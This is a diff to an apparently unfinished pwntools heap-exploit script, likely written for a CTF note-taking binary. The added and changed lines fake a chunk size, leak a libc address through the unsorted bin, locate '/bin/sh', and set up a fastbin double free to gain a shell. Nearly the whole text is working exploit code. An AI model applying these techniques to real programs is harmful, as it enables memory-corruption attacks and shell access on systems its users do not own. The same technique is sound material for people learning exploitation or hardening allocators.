@@ -41,17 +41,26 @@ p += (p64(0x0))
 p += (p64(0xa1)) # make n1 small bin
 add(0x0, p, '\x87' * 48)
 
-# fastbin[0x10] --> n[0]
+# fastbin[0x20] --> n[0]
 # unsorted bin --> n[1]
 delete(0)
 delete(1)
 
 # buff n[0] to make n[1], is_freed flag printable
-add(0x18, '\x18' * 8, '\x18' * 0x30)
+add(0x18, '\x18' * 8, '\x18' * 0x30) # n0
 show()
 
 r.recvuntil('Note 1:\n  Data: ')
 libc_base = u64(r.recv(6) + '\0\0') - 0x3c4b78
 print('libc_base --> ', hex(libc_base))
 
+binsh = libc_base + libc.search('/bin/sh').next()
+pause()
+
+# now n0, n2, n3 still alive, n1 will have double free error, so use free(n2), free(n3) free(n2) for fastbin attack
+delete(2)
+delete(3)
+# buff n[0], to make n[1], is_freed flag freeable
+add(0x18, '\x18' * 8, '\x18' * 0x30) # n1
+delete(2)
 r.interactive()
